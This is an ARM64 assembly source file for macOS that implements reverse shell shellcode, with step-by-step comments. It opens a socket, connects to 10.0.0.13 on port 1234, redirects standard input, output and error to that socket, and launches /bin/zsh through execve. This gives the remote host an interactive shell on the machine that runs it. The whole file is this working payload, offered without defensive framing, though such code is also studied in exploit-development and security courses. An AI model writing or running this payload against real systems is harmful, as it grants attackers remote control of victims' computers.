.global _main
.align 4

_main:
    ;;; (1) obtain socket file descriptor
    mov     X3, #0x0201             ; address family PF_INET = 2
    lsr     X0, X3, #8              ;
    lsr     X1, X0, #1              ; connection type SOCK_STREAM = 1
    mov     X2, XZR                 ; protocol IPPROTO_IP = 0
    mov     X16, #97                ; BSD system call 97 for socket
    svc     #0xFFFF                 ; call kernel to obtain socket
    lsl     X19, X0, #0             ; save socket descriptor in X19
    ;;; (2) connect socket to remote address 10.0.0.13
    mov     X3, #0x0200             ; set sin_len = 0, sin_family = 2 = PF_INET
    movk    X3, #0xD204, lsl#16     ; sin_port = 1234 (big endian)
    movk    X3, #0x000A, lsl#32     ; move IP address 10.0.0.13 into higher order bits of X3
    movk    X3, #0x0D00, lsl#48     ; ... (big endian)
    stp     X3, XZR, [SP,#-16]!     ; push sockaddr_in structure to stack (XZR for 0 padding)
    add     X1, SP, XZR             ; pointer to sockaddr_in struct
    mov     X2, #16                 ; length in byte of sockaddr_in struct
    mov     X16, #98                ; BSD system call 98 for connect
    svc     #0xFFFF                 ; call kernel to connect socket to remote address
    ;;; (3) duplicate file descriptors STDIN, STDOUT, STDERR
    mov     X0, X19                 ; restore socket descriptor to X0
    mov     X1, #0x0201             ; file descriptor 2 = STDERR
    lsr     X1, X1, #8              ;
    mov     X16, #90                ; BSD system call 90 for dup2
    svc     #0xFFFF                 ; call kernel to duplicate STDERR
    mov     X0, X19                 ; restore socket descriptor to X0
    mov     X1, #0x0101             ; file descriptor 1 = STDOUT
    lsr     X1, X1, #8              ;
    svc     #0xFFFF                 ; call kernel to duplicate STDOUT
    mov     X0, X19                 ; restore socket descriptor to X0
    mov     X1, XZR                 ; file descriptor 0 = STDIN
    svc     #0xFFFF                 ; call kernel to duplicate STDIN
    ;;; (4) launch shell via execve
    mov     X3, #0x622F             ; move "/bin/zsh" into X3 (little endian)
    movk    X3, #0x6E69, lsl#16     ;
    movk    X3, #0x7A2F, lsl#32     ;
    movk    X3, #0x6873, lsl#48     ;
    stp     X3, XZR, [SP,#-16]!     ; push path and terminating 0 to stack
    add     X0, SP, XZR             ; save pointer to argv[0] = path
    stp     X0, XZR, [SP,#-16]!     ; push argv[0] and terminating 0 to stack
    add     X1, SP, XZR             ; move pointer to argv into X1
    mov     X2, XZR                 ; third argument for execve ignored
    mov     X16, #59                ; BSD system call 59 for execve
    svc     #0xFFFF                 ; call kernel to run execve
